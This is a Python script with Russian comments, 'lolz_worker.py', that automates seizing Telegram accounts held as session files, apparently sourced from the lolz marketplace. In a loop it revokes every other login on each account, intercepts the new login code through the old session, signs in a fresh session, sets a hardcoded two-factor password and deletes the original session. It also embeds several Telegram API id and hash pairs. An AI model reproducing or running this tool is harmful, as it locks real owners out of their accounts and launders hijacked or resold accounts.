"""
Brown V2 | lolz_worker.py
Автоматическая пересадка lolz-аккаунтов.

Цикл каждые 10 минут:
1. Берём сессию из lolz/ (без суффикса _new)
2. Кикаем все чужие сессии (ResetAuthorizations)
3. Запрашиваем код входа (SendCode) на номер аккаунта
4. Читаем код из диалога с Telegram через lolz-сессию
5. Авторизуем новую сессию sessions/НОМЕР_new.session
6. Ставим облачный пароль Ali095095 через СТАРУЮ lolz-сессию
7. Logout старой сессии + удаляем файл lolz/

Запуск: python3 lolz_worker.py
Или как systemd-сервис.
"""

import asyncio
import os
import re
import logging
import random

from telethon import TelegramClient, events as tl_events
from telethon.tl.functions.auth import (
    ResetAuthorizationsRequest,
    SendCodeRequest,
    SignInRequest,
)
from telethon.errors import FloodWaitError

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("logs/lolz_worker.log", encoding="utf-8"),
    ]
)
logger = logging.getLogger("lolz_worker")

# ─── Конфиг ───────────────────────────────────────────────────────────────────
LOLZ_FOLDER      = "lolz"
OUTPUT_FOLDER    = "sessions"      # куда кладём _new сессии
PREM_FOLDER      = "prem_sessions"
CLOUD_PASS       = "Ali095095"
CHECK_INTERVAL   = 3 * 60         # 3 минуты
CODE_WAIT        = 30             # секунд ждём код
CODE_RETRIES     = 6              # попыток прочитать код
MAX_CONCURRENT   = 5              # параллельных сессий

API_PAIRS = [
    ("24565698",  "5a084b434f8505ace703485b9da85040"),
    ("27904162",  "e7cba879b1c643ba77490bf328df5eab"),
    ("23037915",  "50f06f5b2223586fde0d1379ea91ebc7"),
    ("29512095",  "0b29a7d42fff002856b9bed64f7ec919"),
    ("25055016",  "25edf5b7becebe91a2d61fe8d9d9931b"),
]

os.makedirs(LOLZ_FOLDER, exist_ok=True)
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

# ─── Утилиты ──────────────────────────────────────────────────────────────────

def _get_lolz_sessions() -> list[str]:
    """Возвращает пути к lolz-сессиям без суффикса _new."""
    result = []
    if not os.path.exists(LOLZ_FOLDER):
        return result
    for f in os.listdir(LOLZ_FOLDER):
        if f.endswith(".session") and "_new" not in f:
            stem = f.replace(".session", "")
            result.append(os.path.join(LOLZ_FOLDER, stem))
    return result


def _rand_api() -> tuple[int, str]:
    api_id, api_hash = random.choice(API_PAIRS)
    return int(api_id), api_hash


def _extract_5digit(text: str) -> str | None:
    if not text:
        return None
    m = re.search(r'\b(\d{5})\b', text)
    return m.group(1) if m else None


def _start_code_listener(client: TelegramClient) -> tuple[asyncio.Future, object]:
    """Регистрирует handler ДО отправки кода. Возвращает (future, handler)."""
    loop = asyncio.get_event_loop()
    fut: asyncio.Future = loop.create_future()

    @client.on(tl_events.NewMessage(incoming=True, from_users=777000))
    async def handler(event):
        if fut.done():
            return
        code = _extract_5digit(event.message.text or "")
        if code:
            logger.info(f"Код получен в реальном времени: {code}")
            fut.set_result(code)

    return fut, handler


async def _get_last_msg_id(client: TelegramClient) -> int:
    """Возвращает ID последнего сообщения от 777000, или 0 если нет."""
    try:
        async for msg in client.iter_messages(777000, limit=1):
            return msg.id
    except Exception:
        pass
    return 0


async def _wait_for_code(
    client: TelegramClient,
    fut: asyncio.Future,
    handler: object,
    timeout: int = CODE_WAIT,
    after_msg_id: int = 0,
) -> str | None:
    """
    Проверяет только сообщения от 777000 НОВЕЕ after_msg_id (т.е. пришедшие
    после SendCodeRequest для этого конкретного аккаунта), затем ждёт event.
    after_msg_id = 0 означает «не проверять историю».
    """
    if after_msg_id > 0:
        try:
            async for msg in client.iter_messages(777000, limit=5, min_id=after_msg_id):
                code = _extract_5digit(msg.text or "")
                if code:
                    logger.info(f"Код найден в истории (после id={after_msg_id}): {code}")
                    client.remove_event_handler(handler)
                    return code
        except Exception as e:
            logger.warning(f"Не удалось прочитать историю 777000: {e}")

    # Ждём новый event
    try:
        code = await asyncio.wait_for(asyncio.shield(fut), timeout=timeout)
        return code
    except asyncio.TimeoutError:
        return None
    finally:
        client.remove_event_handler(handler)


async def _set_cloud_password(client: TelegramClient, password: str) -> bool:
    """Ставит облачный пароль через СТАРУЮ сессию используя Telethon edit_2fa."""
    try:
        await client.edit_2fa(new_password=password, hint="")
        logger.info("Облачный пароль установлен ✅")
        return True
    except Exception as e:
        logger.warning(f"Ошибка установки пароля: {e}")
        return False


# ─── Основная логика обработки одной сессии ──────────────────────────────────

async def process_lolz_session(session_path: str) -> bool:
    """
    Обрабатывает одну lolz-сессию.
    Возвращает True если успешно.
    """
    session_name = os.path.basename(session_path)
    logger.info(f"[{session_name}] Начинаю обработку...")

    api_id, api_hash = _rand_api()

    # Подключаемся к lolz-сессии
    lolz_client = TelegramClient(
        session_path, api_id, api_hash,
        system_version="4.16.30-vxCUSTOM"
    )

    try:
        await asyncio.wait_for(lolz_client.connect(), timeout=15)

        if not await lolz_client.is_user_authorized():
            logger.warning(f"[{session_name}] Не авторизован, пропускаю")
            await lolz_client.disconnect()
            return False

        me = await lolz_client.get_me()
        phone = me.phone
        logger.info(f"[{session_name}] Аккаунт: +{phone}")

        # ── Шаг 1: Кикаем все чужие сессии ───────────────────────────────────
        logger.info(f"[{session_name}] Кикаю все сессии...")
        try:
            await lolz_client(ResetAuthorizationsRequest())
            logger.info(f"[{session_name}] Все сессии кикнуты ✅")
        except FloodWaitError as e:
            logger.warning(f"[{session_name}] FloodWait {e.seconds}с — пропускаю на этот раз")
            await lolz_client.disconnect()
            return False
        except Exception as e:
            logger.warning(f"[{session_name}] Ошибка кика: {e}")
            await lolz_client.disconnect()
            return False

        await asyncio.sleep(2)

        # ── Шаг 2: Запоминаем последний msg_id от 777000, регистрируем слушатель
        last_msg_id = await _get_last_msg_id(lolz_client)
        code_fut, code_handler = _start_code_listener(lolz_client)

        # ── Шаг 3: Запрашиваем код входа ─────────────────────────────────────
        logger.info(f"[{session_name}] Запрашиваю код входа...")
        new_api_id, new_api_hash = _rand_api()
        new_session_name = f"{session_name}_new"
        new_session_path = os.path.join(OUTPUT_FOLDER, new_session_name)

        new_client = TelegramClient(
            new_session_path, new_api_id, new_api_hash,
            system_version="4.16.30-vxCUSTOM"
        )

        try:
            await asyncio.wait_for(new_client.connect(), timeout=15)

            from telethon.tl.types import CodeSettings
            sent = await new_client(SendCodeRequest(
                phone_number=f"+{phone}",
                api_id=new_api_id,
                api_hash=new_api_hash,
                settings=CodeSettings()
            ))
            phone_code_hash = sent.phone_code_hash
            logger.info(f"[{session_name}] Код запрошен, ждём...")

        except Exception as e:
            logger.warning(f"[{session_name}] Ошибка запроса кода: {e}")
            lolz_client.remove_event_handler(code_handler)
            try:
                await new_client.disconnect()
            except Exception:
                pass
            await lolz_client.disconnect()
            # Чистим неполную сессию
            for ext in [".session", ".session-journal"]:
                try:
                    os.remove(new_session_path + ext)
                except Exception:
                    pass
            return False

        # ── Шаг 4: Читаем код (только новые сообщения + event) ───────────────
        code = await _wait_for_code(lolz_client, code_fut, code_handler,
                                    timeout=CODE_WAIT, after_msg_id=last_msg_id)

        if not code:
            logger.warning(f"[{session_name}] Код не получен за {CODE_WAIT}с")
            try:
                await new_client.disconnect()
            except Exception:
                pass
            await lolz_client.disconnect()
            for ext in [".session", ".session-journal"]:
                try:
                    os.remove(new_session_path + ext)
                except Exception:
                    pass
            return False

        # ── Шаг 5: Авторизуем новую сессию ───────────────────────────────────
        logger.info(f"[{session_name}] Авторизую новую сессию с кодом {code}...")
        try:
            await new_client(SignInRequest(
                phone_number=f"+{phone}",
                phone_code_hash=phone_code_hash,
                phone_code=code,
            ))
            logger.info(f"[{session_name}] Новая сессия авторизована ✅")
        except Exception as e:
            logger.warning(f"[{session_name}] Ошибка авторизации: {e}")
            try:
                await new_client.disconnect()
            except Exception:
                pass
            await lolz_client.disconnect()
            for ext in [".session", ".session-journal"]:
                try:
                    os.remove(new_session_path + ext)
                except Exception:
                    pass
            return False

        # ── Шаг 6: Ставим облачный пароль через СТАРУЮ сессию ────────────────
        logger.info(f"[{session_name}] Ставлю облачный пароль через старую сессию...")
        await _set_cloud_password(lolz_client, CLOUD_PASS)

        # ── Шаг 7: Logout старой + удаление ──────────────────────────────────
        logger.info(f"[{session_name}] Выхожу из старой сессии и удаляю...")
        try:
            await lolz_client.log_out()
        except Exception:
            pass
        try:
            await lolz_client.disconnect()
        except Exception:
            pass

        # Удаляем lolz-сессию
        for ext in [".session", ".session-journal"]:
            path = session_path + ext
            try:
                if os.path.exists(path):
                    os.remove(path)
                    logger.info(f"Удалён: {path}")
            except Exception as e:
                logger.warning(f"Не удалось удалить {path}: {e}")

        # Закрываем новый клиент
        try:
            await new_client.disconnect()
        except Exception:
            pass

        logger.info(f"[{session_name}] ✅ Готово! Новая сессия: {new_session_path}.session")
        return True

    except Exception as e:
        logger.error(f"[{session_name}] Неожиданная ошибка: {e}")
        try:
            await lolz_client.disconnect()
        except Exception:
            pass
        return False


# ─── Главный цикл ─────────────────────────────────────────────────────────────

async def worker_loop():
    logger.info("=" * 50)
    logger.info("Lolz Worker запущен")
    logger.info(f"Папка lolz: {os.path.abspath(LOLZ_FOLDER)}")
    logger.info(f"Интервал: {CHECK_INTERVAL // 60} минут")
    logger.info("=" * 50)

    while True:
        sessions = _get_lolz_sessions()

        if not sessions:
            logger.info("Нет сессий в lolz/ — жду...")
        else:
            logger.info(f"Найдено {len(sessions)} lolz-сессий, обрабатываю параллельно (до {MAX_CONCURRENT})...")
            sem = asyncio.Semaphore(MAX_CONCURRENT)

            async def _run(session_path):
                async with sem:
                    try:
                        success = await process_lolz_session(session_path)
                        if success:
                            logger.info(f"✅ {os.path.basename(session_path)} обработана успешно")
                        else:
                            logger.info(f"⏳ {os.path.basename(session_path)} — не удалось, попробую позже")
                    except Exception as e:
                        logger.error(f"❌ {session_path}: {e}")
                    await asyncio.sleep(1)

            await asyncio.gather(*[_run(s) for s in sessions])

        logger.info(f"Следующая проверка через {CHECK_INTERVAL // 60} минут...")
        await asyncio.sleep(CHECK_INTERVAL)


if __name__ == "__main__":
    asyncio.run(worker_loop())
